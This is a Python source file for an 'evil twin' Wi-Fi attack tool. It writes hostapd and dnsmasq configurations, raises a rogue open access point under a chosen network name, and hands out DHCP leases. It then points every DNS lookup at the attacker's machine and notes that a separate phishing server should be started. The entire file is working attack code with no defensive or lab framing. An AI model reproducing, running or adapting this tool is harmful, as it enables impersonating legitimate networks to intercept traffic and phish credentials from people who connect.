import subprocess
import os
import time

class EvilTwin:
    def __init__(self):
        self.hostapd_process = None
        self.dnsmasq_process = None

    def create_configs(self, interface, ssid):
        # Create temporary config files
        hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        with open("hostapd.conf", "w") as f:
            f.write(hostapd_conf)

        dnsmasq_conf = f"""
interface={interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
"""
        with open("dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)

    def start_evil_twin(self, interface, ssid):
        if hasattr(os, 'geteuid') and os.geteuid() != 0:
            return "Error: Must run as root (Linux)."

        try:
            # Setup Interface IP
            subprocess.run(["ifconfig", interface, "192.168.1.1", "netmask", "255.255.255.0", "up"])
            
            self.create_configs(interface, ssid)
            
            # Start Services
            self.dnsmasq_process = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])
            self.hostapd_process = subprocess.Popen(["hostapd", "hostapd.conf"])
            
            # Start Phishing Server (Separate flask thread usually, assuming running on port 80)
            return "Evil Twin Started (AP + DNS + DHCP). Start Phishing Server separately."
        except Exception as e:
            return f"Error: {e}"

    def stop_evil_twin(self):
        if self.hostapd_process:
            self.hostapd_process.terminate()
        if self.dnsmasq_process:
            self.dnsmasq_process.terminate()
            
        # Cleanup
        try:
            os.remove("hostapd.conf")
            os.remove("dnsmasq.conf")
        except:
            pass
            
        return "Evil Twin Stopped."
